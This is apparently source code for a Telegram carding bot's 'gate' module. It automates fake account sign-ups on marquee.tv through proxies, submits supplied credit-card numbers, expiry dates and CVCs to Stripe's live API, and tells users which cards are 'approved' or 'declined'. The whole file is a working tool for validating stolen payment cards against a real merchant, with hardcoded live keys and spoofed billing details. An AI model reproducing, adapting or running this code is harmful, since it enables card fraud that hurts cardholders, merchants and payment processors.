import requests, time, random, datetime, sys, json
sys.path.append('/checker/')
from traceback import format_exc
from Commands import Postgre, Staff
from Commands.Tools.addr import fake

def gate(cc:list, _bin:dict, edit:dict, bot:object) -> dict:
    data  = fake('us')['response']
    proxy = Postgre.proxy()
    try:
        #//! Requests 1
        headers1 = {'accept':'application/json, text/plain, */*', 'content-type':'application/json;charset=UTF-8', 'origin':'https://www.marquee.tv', 'referer':'https://www.marquee.tv/'}
        payload1 = '{"name":"'+data["f_name"]+' '+data["l_name"]+'","email":"'+data["mail"]+'","password":"Asteroide$12","emailConsent":true,"tveUserId":null,"preferences":{}}'
        request1 = requests.post(url = 'https://prod-api.viewlift.com/identity/signup?site=marquee-tv&deviceId=browser-86ea2980-8bd5-1543-878a-db3588556be7', data = payload1, headers = headers1, proxies = proxy).json()

        a = bot.editMessage(text = f"<b><i>$ Fetching Data_ ⛈</i></b>\n<b><i><u>Status: </u></i></b> <code>Preparing!</code> 🟨", message_id = edit['message_id'], chat_id = edit['chat_id'])

        #//! Requests 2
        headers2 = {'accept':'application/json', 'content-type':'application/x-www-form-urlencoded', 'origin':'https://js.stripe.com', 'referer':'https://js.stripe.com/'}
        payload2 = f"card[name]={data['f_name']}+{data['l_name']}&card[address_line1]=Timesquare+321&card[address_city]=New+York&card[address_state]=New+York&card[address_zip]=10010&card[address_country]=United+States&card[number]={cc[0]}&card[cvc]={cc[3]}&card[exp_month]={cc[1]}&card[exp_year]={cc[2][2:]}&guid=53c01a25-dfdf-4142-a8bc-ad8decf3f6b314f27e&muid=c384b1b0-daf2-48fd-b53c-8be11fcebb6997fbff&sid=20075a9e-288f-4a3a-9aee-f091934ff55b8179e7&payment_user_agent=stripe.js%2Fa8b551343%3B+stripe-js-v3%2Fa8b551343&time_on_page=103728&key=pk_live_7w6kHnsdQaibnY4MaybSNFAm00wK0lmbDm"
        request2 = requests.post(url = 'https://api.stripe.com/v1/tokens', data = payload2, headers = headers2, proxies = proxy).json()
        
        if 'error' in request2.keys():
            a = bot.editMessage(text = f"<b><i>$ Fetching Data_ ⛈</i></b>\n<b><i><u>Status: </u></i></b> <code>Checked!</code> 🟩", message_id = a['message_id'], chat_id = a['chat_id'])
            return {'status':True, 'response':request2['error']['message'], 'success': 'declined! ❌', 'message_id':a['message_id']}


        #//! Request 3
        headers3 = {'accept':'application/json, text/plain, */*', 'authorization':request1['authorizationToken'], 'content-type':'application/json;charset=UTF-8', 'origin':'https://www.marquee.tv', 'referer':'https://www.marquee.tv/', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36','x-api-key':'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef'}
        payload3 = "{}"
        request3 = requests.post(url = 'https://prod-api.viewlift.com/payments/stripe/setup_intent?site=marquee-tv', data = payload3, headers = headers3, proxies = proxy).json()

        #//! Request 4
        headers4 = {'accept':'application/json', 'content-type':'application/x-www-form-urlencoded', 'origin':'https://js.stripe.com', 'referer':'https://js.stripe.com/'}
        payload4 = f"payment_method_data[type]=card&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][city]=New+York&payment_method_data[billing_details][address][line1]=Timesquare+321&payment_method_data[billing_details][address][state]=New+York&payment_method_data[billing_details][address][postal_code]=10010&payment_method_data[billing_details][name]={data['f_name']}+{data['l_name']}&payment_method_data[card][number]={cc[0]}&payment_method_data[card][cvc]={cc[3]}&payment_method_data[card][exp_month]={cc[1]}&payment_method_data[card][exp_year]={cc[2][2:]}&payment_method_data[guid]=53c01a25-dfdf-4142-a8bc-ad8decf3f6b314f27e&payment_method_data[muid]=c384b1b0-daf2-48fd-b53c-8be11fcebb6997fbff&payment_method_data[sid]=20075a9e-288f-4a3a-9aee-f091934ff55b8179e7&payment_method_data[payment_user_agent]=stripe.js%2Fa8b551343%3B+stripe-js-v3%2Fa8b551343&payment_method_data[time_on_page]=109481&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_7w6kHnsdQaibnY4MaybSNFAm00wK0lmbDm&client_secret={request3['client_secret']}"
        request4 = requests.post(url = f'https://api.stripe.com/v1/setup_intents/{request3["id"]}/confirm', data = payload4, headers = headers4, proxies = proxy).json()
        
        a = bot.editMessage(text = f"<b><i>$ Fetching Data_ ⛈</i></b>\n<b><i><u>Status: </u></i></b> <code>Checked!</code> 🟩", message_id = a['message_id'], chat_id = a['chat_id'])
        if 'status' in request4.keys():
            if request4['status'] == 'succeeded':
                return {'status':True, 'response':'Approved!', 'success': 'approved! ✅', 'message_id':a['message_id']}
            else:
                return {'status':True, 'response':f"stripe_3ds2_fingerprint", 'success': 'declined! ❌', 'message_id':a['message_id']}
        else:
            if request4['error']['message'].lower() in Postgre.stripe_r:
                return {'status':True, 'response':f"{request4['error']['message']}", 'success': 'approved! ✅', 'message_id':a['message_id']}
            else:
                return {'status':True, 'response':f"{request4['error']['message']}", 'success': 'declined! ❌', 'message_id':a['message_id']}
    except Exception as a:
        bot.raise_post(f"Error en el gate: {str(a)[0:350]}")
        return {'status':False}

def pdCmd(update, context, bot) -> None:
    args = context['args'] if len(context['args']) > 0 else update['reply_to'] if update['reply_to'] != 'None' else context['args']
    args = args if type(args) == str else args['text']
    user = Postgre.view(user_id=update['user_id'])
    chat = Postgre.view(user_id=update['chat_id'])
    cmd  = Postgre.viewCmd(cmd = context['command'])
    bot.sendAction(chat_id = update['chat_id'], action = 'typing')
    a = bot.replyMessage(text=f"<b><i>$ Fetching Data_ ⛈</i></b>\n<b><i><u>Status: </u></i></b> <code>Waiting!</code> 🟥", chat_id = update['chat_id'], reply_id = update['message_id'])
    b = Staff.gates(user = user, chat =  chat, text = args, cmd = cmd, bot = bot)
    try:    
        if b['status']:
            a = bot.editMessage(text = f"<b><i>$ Fetching Data_ ⛈</i></b>\n<b><i><u>Status: </u></i></b> <code>Checking!</code> 🟧", chat_id = update['chat_id'], message_id = a['message_id'])
            now  = time.time()
            Postgre.update(f"UPDATE users SET l_reg = '{datetime.datetime.now()}' WHERE user_id = '{update['user_id']}'")
            checker = gate(cc = b['cc'], _bin = b['bin'], edit = {'chat_id':update['chat_id'], 'message_id':a['message_id']}, bot = bot)
            if checker['status']:
                a = bot.editMessage(text = f"<b><i>$ {cmd['name'].title()} 🌩</i></b>\n━━━━━━━━━━━━━━━━━\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Cc:</u></i></b> <code>{b['cc'][0]}|{b['cc'][1]}|{b['cc'][2]}|{b['cc'][3]}</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Status:</u></i></b> <code>{checker['success'].title()}</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Response:</u></i></b> <code>{checker['response'].title()}</code>\n\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Info:</u></i></b> <code>{b['bin']['brand'].title()}</code> - <code>{b['bin']['type'].title()}</code> - <code>{b['bin']['level'].title()}</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Bank:</u></i></b> <code>{b['bin']['bank'].title()}</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>Country:</u></i></b> <code>{b['bin']['country'].title()}</code>[{b['bin']['flag']}] - <code>{b['bin']['currency'].title()}</code>\n\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>T.Taken:</u></i></b> <code>{str(round((time.time() - now), 1))}'s</code> | <b><i><u>Proxy:</u></i></b> <code>Live[✅]</code>\n[<a href='https://t.me/Ghidorah_chkbot'>ᚸ</a>] <b><i><u>User:</u></i></b> @{update['username']} [<b>{user['c_name'].title()}</b>]\n━━━━━━━━━━━━━━━━━\n[↯] <b><i><u>By:</u></i></b> <code>SoyQuetzal</code> ☁️", chat_id=update['chat_id'], message_id=checker['message_id'])
            else:
                Postgre.update(f"UPDATE users SET l_reg = '{user['l_reg']}' WHERE user_id = '{update['user_id']}'")
                bot.editMessage(text = f"<b><i>$ Wrong Data_ ⚠️</i></b>\n<b><i><u>Raise:</u></i></b> <code>There is a problem, contact an administrator and place recheck!</code>", chat_id = update['chat_id'], message_id = a['message_id'])
        else:
            bot.editMessage(text = f"{b['text']}", chat_id = update['chat_id'], message_id = a['message_id'])
    except Exception as a:
        bot.raise_post(f"Error en pdCMD, {str(a)}")